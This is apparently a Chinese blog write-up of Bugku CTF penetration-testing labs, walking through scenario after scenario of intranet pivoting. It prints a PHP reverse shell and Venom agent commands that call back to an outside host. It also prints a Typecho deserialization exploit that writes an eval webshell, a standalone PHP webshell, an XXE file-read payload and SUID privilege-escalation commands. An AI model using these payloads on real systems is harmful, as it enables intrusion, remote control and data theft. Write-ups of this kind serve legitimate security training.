<p><img src="/2024/07/30/hello-world/image-20250218135818744.png" alt="image-20250218135818744"></p>
<p>发现经典字段</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Set-Cookie: rememberMe=deleteMe;</span><br></pre></td></tr></tbody></table></figure>

<p>确定为shiro框架，直接拿出工具</p>
<p><img src="/2024/07/30/hello-world/image-20250218140053333.png" alt="image-20250218140053333"></p>
<p>查找flag</p>
<p><img src="/2024/07/30/hello-world/image-20250218140152882.png" alt="image-20250218140152882"></p>
<p>发现/root/flag读取不到，只能读到/home/flag</p>
<h3 id="场景8"><a href="#场景8" class="headerlink" title="场景8"></a>场景8</h3><p><img src="/2024/07/30/hello-world/image-20250218140833264.png" alt="image-20250218140833264"></p>
<p>尝试进行find提权</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">find / -perm -4000 -type f 2&gt;/dev/null </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">find flag -exec whoami \;</span><br></pre></td></tr></tbody></table></figure>



<ul>
<li><code>find flag</code>：在当前目录下查找名为 <code>flag</code> 的文件或目录。</li>
<li><code>-exec whoami \;</code>：对每个找到的文件或目录执行 <code>whoami</code> 命令。</li>
<li><code>whoami</code>：显示当前用户的用户名。</li>
<li><code>\;</code>：表示 <code>-exec</code> 命令的结束。</li>
</ul>
<p><img src="/2024/07/30/hello-world/image-20250218141204946.png" alt="image-20250218141204946"></p>
<p>拿到flag，并且提示内网</p>
<h3 id="场景9"><a href="#场景9" class="headerlink" title="场景9"></a>场景9</h3><p><img src="/2024/07/30/hello-world/image-20250218141831460.png" alt="image-20250218141831460"></p>
<p>上传fscan，venom</p>
<p>扫一下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./fscan -h 192.168.0.2/24</span><br></pre></td></tr></tbody></table></figure>

<p>蚁剑是属于虚拟终端，看不到回显</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat result.txt</span><br><span class="line"></span><br><span class="line">[+] 端口开放 192.168.0.4:80</span><br><span class="line">[+] 端口开放 192.168.0.2:80</span><br><span class="line">[+] 端口开放 192.168.0.1:80</span><br><span class="line">[+] 端口开放 192.168.0.1:22</span><br><span class="line">[+] 端口开放 192.168.0.4:3306</span><br><span class="line">[+] 端口开放 192.168.0.3:8080</span><br><span class="line">[+] 端口开放 192.168.0.1:8080</span><br><span class="line">[+] 端口开放 192.168.0.2:9999</span><br><span class="line">[+] 端口开放 192.168.0.1:9999</span><br><span class="line">[*] 网站标题 http://192.168.0.4        状态码:200 长度:8351   标题:博客首页</span><br><span class="line">[*] 网站标题 http://192.168.0.1:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://192.168.0.1:8080/login;jsessionid=C2F897E86587DFF88D23E0B904BEE5F1</span><br><span class="line">[*] 网站标题 http://192.168.0.3:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://192.168.0.3:8080/login;jsessionid=E38D96AE83415803DBF186137E09B661</span><br><span class="line">[*] 网站标题 http://192.168.0.3:8080/login;jsessionid=E38D96AE83415803DBF186137E09B661 状态码:200 长度:2608   标题:Login Page</span><br><span class="line">[*] 网站标题 http://192.168.0.1:8080/login;jsessionid=C2F897E86587DFF88D23E0B904BEE5F1 状态码:200 长度:2608   标题:Login Page</span><br><span class="line">[*] 网站标题 http://192.168.0.1        状态码:200 长度:59431  标题:W3School教程系统 | 打造专一的web在线教程系统</span><br><span class="line">[*] 网站标题 http://192.168.0.2        状态码:200 长度:59431  标题:W3School教程系统 | 打造专一的web在线教程系统</span><br><span class="line">[+] 端口开放 192.168.0.1:8080</span><br><span class="line">[+] 端口开放 192.168.0.3:8080</span><br><span class="line">[+] 端口开放 192.168.0.1:80</span><br><span class="line">[+] 端口开放 192.168.0.4:80</span><br><span class="line">[+] 端口开放 192.168.0.2:80</span><br><span class="line">[+] 端口开放 192.168.0.1:22</span><br><span class="line">[+] 端口开放 192.168.0.4:3306</span><br><span class="line">[+] 端口开放 192.168.0.1:9999</span><br><span class="line">[+] 端口开放 192.168.0.2:9999</span><br><span class="line">[*] 网站标题 http://192.168.0.3:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://192.168.0.3:8080/login;jsessionid=6E003D41C5A343B93B3512EE11C3AB2D</span><br><span class="line">[*] 网站标题 http://192.168.0.3:8080/login;jsessionid=6E003D41C5A343B93B3512EE11C3AB2D 状态码:200 长度:2608   标题:Login Page</span><br><span class="line">[*] 网站标题 http://192.168.0.1:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://192.168.0.1:8080/login;jsessionid=411200418B3C1FF134349348C58EF4D8</span><br><span class="line">[*] 网站标题 http://192.168.0.1:8080/login;jsessionid=411200418B3C1FF134349348C58EF4D8 状态码:200 长度:2608   标题:Login Page</span><br><span class="line">[*] 网站标题 http://192.168.0.2        状态码:200 长度:59431  标题:W3School教程系统 | 打造专一的web在线教程系统</span><br><span class="line">[*] 网站标题 http://192.168.0.1        状态码:200 长度:59431  标题:W3School教程系统 | 打造专一的web在线教程系统</span><br><span class="line">[*] 网站标题 http://192.168.0.4        状态码:200 长度:8351   标题:博客首页</span><br><span class="line">[+] 检测到漏洞 http://192.168.0.1:8080/ poc-yaml-shiro-key 参数:[{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]</span><br><span class="line">[+] 检测到漏洞 http://192.168.0.3:8080/ poc-yaml-shiro-key 参数:[{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]</span><br><span class="line">[+] [发现漏洞] 目标: http://192.168.0.4</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br><span class="line">[+] 端口开放 192.168.0.4:80</span><br><span class="line">[+] 端口开放 192.168.0.2:80</span><br><span class="line">[+] 端口开放 192.168.0.1:80</span><br><span class="line">[+] 端口开放 192.168.0.1:22</span><br><span class="line">[+] 端口开放 192.168.0.4:3306</span><br><span class="line">[+] 端口开放 192.168.0.2:9999</span><br><span class="line">[+] 端口开放 192.168.0.1:9999</span><br><span class="line">[+] 端口开放 192.168.0.3:8080</span><br><span class="line">[+] 端口开放 192.168.0.1:8080</span><br><span class="line">[*] 网站标题 http://192.168.0.4        状态码:200 长度:8351   标题:博客首页</span><br><span class="line">[*] 网站标题 http://192.168.0.1:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://192.168.0.1:8080/login;jsessionid=43F761204A640C7D1244FDE0E0FC4270</span><br><span class="line">[*] 网站标题 http://192.168.0.3:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://192.168.0.3:8080/login;jsessionid=FBAB73CE91CDA0A018C73B8852BBA054</span><br><span class="line">[*] 网站标题 http://192.168.0.3:8080/login;jsessionid=FBAB73CE91CDA0A018C73B8852BBA054 状态码:200 长度:2608   标题:Login Page</span><br><span class="line">[*] 网站标题 http://192.168.0.1:8080/login;jsessionid=43F761204A640C7D1244FDE0E0FC4270 状态码:200 长度:2608   标题:Login Page</span><br><span class="line">[*] 网站标题 http://192.168.0.1        状态码:200 长度:59431  标题:W3School教程系统 | 打造专一的web在线教程系统</span><br><span class="line">[*] 网站标题 http://192.168.0.2        状态码:200 长度:59431  标题:W3School教程系统 | 打造专一的web在线教程系统</span><br><span class="line">[+] [发现漏洞] 目标: http://192.168.0.4</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br><span class="line">[+] 检测到漏洞 http://192.168.0.1:8080/ poc-yaml-shiro-key 参数:[{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]</span><br><span class="line">[+] 检测到漏洞 http://192.168.0.3:8080/ poc-yaml-shiro-key 参数:[{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>运用php文件反弹shell</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span>=<span class="string">'8.134.149.24'</span>;</span><br><span class="line"><span class="variable">$port</span>=<span class="string">'2333'</span>;</span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">'/bin/sh'</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>执行php b.php</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">攻击机：./admin_linux_x64 -lport 9999</span><br><span class="line">靶机：./agent_linux_x64 -rhost 8.134.149.24 -rport 9999</span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/30/hello-world/image-20250218163727625.png" alt="image-20250218163727625"></p>
<p>成功访问</p>
<p><img src="/2024/07/30/hello-world/image-20250218151202143.png" alt="image-20250218151202143"></p>
<p>先配置proxifier，然后直接用Nday打tp漏洞</p>
<p><img src="/2024/07/30/hello-world/image-20250218163837694.png" alt="image-20250218163837694"></p>
<p>蚁剑连接拿flag和提示</p>
<p><img src="/2024/07/30/hello-world/image-20250218160239648.png" alt="image-20250218160239648"></p>
<h3 id="场景10"><a href="#场景10" class="headerlink" title="场景10"></a>场景10</h3><p>发现数据库配置</p>
<p><img src="/2024/07/30/hello-world/image-20250218160523491.png" alt="image-20250218160523491"></p>
<p>连接数据库</p>
<p><img src="/2024/07/30/hello-world/image-20250218163914553.png" alt="image-20250218163914553"></p>
<h3 id="场景11"><a href="#场景11" class="headerlink" title="场景11"></a>场景11</h3><p>利用PwnKit提权<a target="_blank" rel="noopener" href="https://gitcode.com/gh_mirrors/cv/CVE-2021-4034"><strong>CVE-2021-4034</strong></a></p>
<p><img src="/2024/07/30/hello-world/image-20250218190919740.png" alt="image-20250218190919740"></p>
<p>或者sudo version 1.8.31</p>
<p>使用sudo提权CVE-2021-3156</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80217770/article/details/144702464">bugkuctf渗透测试1(超详细版)_bugku 渗透测试1-CSDN博客</a></p>
<h2 id="渗透测试2"><a href="#渗透测试2" class="headerlink" title="渗透测试2"></a>渗透测试2</h2><p>开题：<a target="_blank" rel="noopener" href="http://106.14.92.16/">http://106.14.92.16:80</a></p>
<p><img src="/2024/07/30/hello-world/image-20250218194234242.png" alt="image-20250218194234242"></p>
<h3 id="场景1-1"><a href="#场景1-1" class="headerlink" title="场景1"></a>场景1</h3><p><img src="/2024/07/30/hello-world/image-20250218194247502.png" alt="image-20250218194247502"></p>
<p>查看源码发现版本</p>
<p><img src="/2024/07/30/hello-world/image-20250218194322791.png" alt="image-20250218194322791"></p>
<p>搜到Nday</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span> </span></span><br><span class="line"><span class="class"></span>{ </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">RSS1</span> = <span class="string">'RSS 1.0'</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">'RSS 2.0'</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">ATOM1</span> = <span class="string">'ATOM 1.0'</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">DATE_RFC822</span> = <span class="string">'r'</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">DATE_W3CDTF</span> = <span class="string">'c'</span>; </span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">EOL</span> = <span class="string">"\n"</span>; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_type</span>; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_items</span>; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_type = <span class="variable language_">$this</span>::<span class="variable constant_">RSS2</span>; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>( </span><br><span class="line">    	<span class="string">'title'</span> =&gt; <span class="string">'1'</span>, </span><br><span class="line">    	<span class="string">'link'</span> =&gt; <span class="string">'1'</span>, </span><br><span class="line">    	<span class="string">'date'</span> =&gt; <span class="number">1508895132</span>, </span><br><span class="line">    	<span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>()), </span><br><span class="line">    	<span class="string">'author'</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(), </span><br><span class="line">    	); </span><br><span class="line">  	} </span><br><span class="line">} </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span> </span></span><br><span class="line"><span class="class"></span>{ </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{ </span><br><span class="line">	<span class="variable language_">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'fputs(fopen(\'shell.php\',\'w\'),\'&lt;?=@eval($_REQUEST[1])?&gt;\')'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>; </span><br><span class="line">	} </span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>( </span><br><span class="line">	<span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>(), </span><br><span class="line">	<span class="string">'prefix'</span> =&gt; <span class="string">'typecho_'</span> </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU1OiJlY2hvICI8P3BocCBwaHBpbmZvKCk7QGV2YWwoXCRfUE9TVFsxXSk7Pz4iID4gc2hlbGwucGhwIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTU6ImVjaG8gIjw/cGhwIHBocGluZm8oKTtAZXZhbChcJF9QT1NUWzFdKTs/PiIgPiBzaGVsbC5waHAiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>要手动加一个referer</p>
<p><img src="/2024/07/30/hello-world/image-20250218195228124.png" alt="image-20250218195228124"></p>
<p><img src="/2024/07/30/hello-world/image-20250218202317881.png" alt="image-20250218202317881"></p>
<p><img src="/2024/07/30/hello-world/image-20250218202341541.png" alt="image-20250218202341541"></p>
<h3 id="场景2-1"><a href="#场景2-1" class="headerlink" title="场景2"></a>场景2</h3><p>发现配置文件</p>
<p><img src="/2024/07/30/hello-world/image-20250218202454788.png" alt="image-20250218202454788"></p>
<p><img src="/2024/07/30/hello-world/image-20250218202550814.png" alt="image-20250218202550814"></p>
<p>找到第二个flag</p>
<h3 id="场景3-1"><a href="#场景3-1" class="headerlink" title="场景3"></a>场景3</h3><p>没提示了查看一下网卡信息</p>
<p><img src="/2024/07/30/hello-world/image-20250218203458663.png" alt="image-20250218203458663"></p>
<p>上fscan扫一下吧</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./fscan -h 192.168.0.2/24</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(www-data:/tmp) $ cat r*</span><br><span class="line">[+] 端口开放 192.168.0.3:80</span><br><span class="line">[+] 端口开放 192.168.0.1:80</span><br><span class="line">[+] 端口开放 192.168.0.2:80</span><br><span class="line">[+] 端口开放 192.168.0.1:22</span><br><span class="line">[+] 端口开放 192.168.0.2:3306</span><br><span class="line">[*] 网站标题 http://192.168.0.2        状态码:200 长度:3392   标题:Harry's Blog</span><br><span class="line">[*] 网站标题 http://192.168.0.1        状态码:200 长度:3392   标题:Harry's Blog</span><br><span class="line">[+] MySQL 192.168.0.2:3306:root </span><br><span class="line">[*] 网站标题 http://192.168.0.3        状态码:200 长度:4789   标题:Bugku后台管理系统</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>配置代理</p>
<blockquote>
<p>./admin_linux_x64 -lport 9999</p>
<p>./agent_linux_x64 -rhost 8.134.149.24 -rport 9999</p>
</blockquote>
<p>访问192.168.0.3发现一个登录框</p>
<p><img src="/2024/07/30/hello-world/image-20250218204222258.png" alt="image-20250218204222258"></p>
<p>登录抓包发现 /source.zip</p>
<p><img src="/2024/07/30/hello-world/image-20250218204521906.png" alt="image-20250218204521906"></p>
<p>下载下来看看,发现是一个log4j</p>
<p><img src="/2024/07/30/hello-world/image-20250218204746570.png" alt="image-20250218204746570"></p>
<p><img src="/2024/07/30/hello-world/image-20250219165433011.png" alt="image-20250219165433011"></p>
<p>成功反弹shell</p>
<p><img src="/2024/07/30/hello-world/image-20250219165308113.png" alt="image-20250219165308113"></p>
<p>env发现三个flag</p>
<p><img src="/2024/07/30/hello-world/image-20250219165715250.png" alt="image-20250219165715250"></p>
<h3 id="场景4-1"><a href="#场景4-1" class="headerlink" title="场景4"></a>场景4</h3><p>直接cat flag是场景四的flag</p>
<p><img src="/2024/07/30/hello-world/image-20250219165549781.png" alt="image-20250219165549781"></p>
<h3 id="场景5-1"><a href="#场景5-1" class="headerlink" title="场景5"></a>场景5</h3><p><img src="/2024/07/30/hello-world/image-20250219165713344.png" alt="image-20250219165713344"></p>
<h3 id="场景6-1"><a href="#场景6-1" class="headerlink" title="场景6"></a>场景6</h3><p>接着查看一下网卡信息</p>
<p><img src="/2024/07/30/hello-world/image-20250219165921973.png" alt="image-20250219165921973"></p>
<p>发现192.168.1.2/24</p>
<p>wget下载fscan和venom</p>
<p><img src="/2024/07/30/hello-world/image-20250219171405974.png" alt="image-20250219171405974"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">vps: </span><br><span class="line">	1. python -m http.server 8000</span><br><span class="line">client: </span><br><span class="line">	1. wget http://xxxxxx:8000/fscan</span><br><span class="line">	2. wget http://xxxxxx:8000/agent_linux_x64</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>fsan扫一下,发现一个git仓库</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 目标 192.168.1.2     存活 (ICMP)</span><br><span class="line">[+] 目标 192.168.1.1     存活 (ICMP)</span><br><span class="line">[+] 目标 192.168.1.3     存活 (ICMP)</span><br><span class="line">[+] ICMP存活主机数量: 3</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 192.168.1.3:80</span><br><span class="line">[+] 端口开放 192.168.1.1:80</span><br><span class="line">[+] 端口开放 192.168.1.2:80</span><br><span class="line">[+] 端口开放 192.168.1.1:22</span><br><span class="line">[+] 存活端口数量: 4</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[*] 网站标题 http://192.168.1.2        状态码:200 长度:4789   标题:Bugku后台管理系统</span><br><span class="line">[*] 网站标题 http://192.168.1.1        状态码:200 长度:3392   标题:Harry's Blog</span><br><span class="line">[*] 网站标题 http://192.168.1.3        状态码:200 长度:524    标题:乙公司Git仓库</span><br></pre></td></tr></tbody></table></figure>

<p>在这台机子上<code>./agent_linux_x64 -lport 9899</code></p>
<p><img src="/2024/07/30/hello-world/image-20250219172339214.png" alt="image-20250219172339214"></p>
<p>可以正常访问了</p>
<p>输入它提示的github网址就可以拿到flag</p>
<p><img src="/2024/07/30/hello-world/image-20250219172532621.png" alt="image-20250219172532621"></p>
<h3 id="场景7-1"><a href="#场景7-1" class="headerlink" title="场景7"></a>场景7</h3><p>这里用的别人的仓库（<a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/webshell-repository.git%EF%BC%89">https://github.com/TheBeastofwar/webshell-repository.git）</a></p>
<p>只解析phtml后缀</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/30/hello-world/image-20250219182208776.png" alt="image-20250219182208776"></p>
<p><img src="/2024/07/30/hello-world/image-20250219182419304.png" alt="image-20250219182419304"></p>
<p>拿到flag</p>
<h3 id="场景8-1"><a href="#场景8-1" class="headerlink" title="场景8"></a>场景8</h3><p><img src="/2024/07/30/hello-world/image-20250219182706606.png" alt="image-20250219182706606"></p>
<p>上传一下</p>
<p><img src="/2024/07/30/hello-world/image-20250219183545222.png" alt="image-20250219183545222"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./fscan -h 10.10.0.2/24</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 10.10.0.1:80</span><br><span class="line">[+] 端口开放 10.10.0.2:80</span><br><span class="line">[+] 端口开放 10.10.0.1:22</span><br><span class="line">[+] 端口开放 10.10.0.3:21</span><br><span class="line">[*] 网站标题 http://10.10.0.2          状态码:200 长度:524    标题:乙公司Git仓库</span><br><span class="line">[*] 网站标题 http://10.10.0.1          状态码:200 长度:3368   标题:Harry's Blog</span><br></pre></td></tr></tbody></table></figure>

<p>搭好代理</p>
<blockquote>
<p>靶机：./agent_linux_x64 -lport 9899</p>
<p>攻击机：connect 192.168.0.3 9899</p>
</blockquote>
<p><img src="/2024/07/30/hello-world/image-20250219185219638.png" alt="image-20250219185219638"></p>
<p>配置proxychains</p>
<blockquote>
<p>[ProxyList]</p>
<p>socks5 8.134.149.24 9998<br>socks5 8.134.149.24 9997<br>socks5 8.134.149.24 9996</p>
</blockquote>
<p>ftp登录账号密码都是guest</p>
<p><img src="/2024/07/30/hello-world/image-20250219184913174.png" alt="image-20250219184913174"></p>
<p>一个flag在当前目录</p>
<p><img src="/2024/07/30/hello-world/image-20250219184940147.png" alt="image-20250219184940147"></p>
<h3 id="场景9-1"><a href="#场景9-1" class="headerlink" title="场景9"></a>场景9</h3><p>另一个在根目录</p>
<p>这里要先进入到根目录在get</p>
<p><img src="/2024/07/30/hello-world/image-20250219184957723.png" alt="image-20250219184957723"></p>
<h2 id="渗透测试3"><a href="#渗透测试3" class="headerlink" title="渗透测试3"></a>渗透测试3</h2><p>开题<a target="_blank" rel="noopener" href="http://101.133.129.4/">http://101.133.129.4/</a></p>
<p><img src="/2024/07/30/hello-world/image-20250220094646799.png" alt="image-20250220094646799"></p>
<h3 id="场景1-2"><a href="#场景1-2" class="headerlink" title="场景1"></a>场景1</h3><p>成功读到<code>/etc/passwd</code></p>
<p><img src="/2024/07/30/hello-world/image-20250220094615348.png" alt="image-20250220094615348"></p>
<p><code>file:///flag</code>读到flag</p>
<p><img src="/2024/07/30/hello-world/image-20250220094736118.png" alt="image-20250220094736118"></p>
<h3 id="场景2-场景3"><a href="#场景2-场景3" class="headerlink" title="场景2&amp;场景3"></a>场景2&amp;场景3</h3><p>接下来fscan扫一下</p>
<blockquote>
<p>[<em>] 最终有效主机数量: 1<br>[</em>] 共解析 218 个有效端口<br>[+] 端口开放 101.133.129.4:22<br>[+] 端口开放 101.133.129.4:80<br>[+] 存活端口数量: 2<br>[<em>] 开始漏洞扫描…<br>[</em>] 网站标题 <a target="_blank" rel="noopener" href="http://101.133.129.4/">http://101.133.129.4</a>      状态码:200 长度:1987   标题:站长之家 - 模拟蜘蛛爬取</p>
</blockquote>
<p>扫描目录，也没发现预留的木马文件</p>
<p>利用ssrf来做一下内网探测，根据前两个靶场，地址选择192.168.0.x或192.168.1.x</p>
<p>发现1，2，10，138，250有结果 1，2还是这个，10是一个被黑的网站，138是一个sql查询，250是一个登录框</p>
<p><img src="/2024/07/30/hello-world/image-20250220100059621.png" alt="image-20250220100059621"></p>
<p>192.168.0.10存在木马shell.php</p>
<p><img src="/2024/07/30/hello-world/image-20250220100206775.png" alt="image-20250220100206775"></p>
<p>web目录一个flag</p>
<p>根目录一个flag</p>
<p><img src="/2024/07/30/hello-world/image-20250220100526916.png" alt="image-20250220100526916"></p>
<h3 id="场景4-2"><a href="#场景4-2" class="headerlink" title="场景4"></a>场景4</h3><p>下载好venom</p>
<p><img src="/2024/07/30/hello-world/image-20250220101159210.png" alt="image-20250220101159210"></p>
<p>然后赋权 <code>chmod 777 agent_linux_x64</code></p>
<p>配置venom</p>
<blockquote>
<p>./admin_linux_x64 -lport 9999</p>
<p>./agent_linux_x64 -rhost 8.134.149.24 -rport 9999</p>
</blockquote>
<p>访问192.168.0.138</p>
<p><img src="/2024/07/30/hello-world/image-20250220103737590.png" alt="image-20250220103737590"></p>
<h3 id="场景7-场景8"><a href="#场景7-场景8" class="headerlink" title="场景7&amp;场景8"></a>场景7&amp;场景8</h3><p>访问192.168.0.250</p>
<p>登录抓包可能是xxe</p>
<p><img src="/2024/07/30/hello-world/image-20250220104118522.png" alt="image-20250220104118522"></p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">Tsuki</span> <span class="keyword">SYSTEM</span> <span class="string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;Tsuki;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/07/30/hello-world/image-20250220104202261.png" alt="image-20250220104202261"></p>
<p>web目录一个，根目录一个</p>
<h3 id="场景5-场景6"><a href="#场景5-场景6" class="headerlink" title="场景5&amp;场景6"></a>场景5&amp;场景6</h3><p><img src="/2024/07/30/hello-world/image-20250220104521715.png" alt="image-20250220104521715"></p>
<p>写一个脚本探测一下</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    url = <span class="string">"http://10.10.0."</span> + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/07/30/hello-world/image-20250220105848765.png" alt="image-20250220105848765"></p>
<p>发现还存在10.10.0.22这台机子，是一个cms</p>
